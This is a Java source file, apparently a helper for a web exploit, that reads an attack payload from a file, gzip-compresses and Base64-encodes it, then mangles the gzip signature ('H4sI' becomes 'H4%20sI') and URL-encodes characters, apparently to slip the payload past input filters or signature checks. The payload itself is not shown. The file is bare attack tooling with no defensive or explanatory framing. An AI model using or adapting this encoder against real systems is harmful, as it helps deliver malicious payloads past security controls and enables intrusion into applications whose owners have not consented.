package org.example;

import java.io.ByteArrayOutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.zip.GZIPOutputStream;

public class FullExploit {
    public static void main(String[] args) throws Exception {
        byte[] rawPayload = Files.readAllBytes(Paths.get("payload.bin"));

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (GZIPOutputStream gzos = new GZIPOutputStream(baos)) {
            gzos.write(rawPayload);
        }
        byte[] gzippedPayload = baos.toByteArray();

        String b64 = Base64.getEncoder().encodeToString(gzippedPayload);

        String finalPayload = doEncode(b64);
        System.out.println(finalPayload);
    }

    private static String doEncode(String s) {
        s = "H4%20sI" + s.substring(4);
        return s.replace("/", "_")
                .replace("+", "%2B")
                .replace("=", "%3D")
                .replace("\r\n", "-");
    }
}
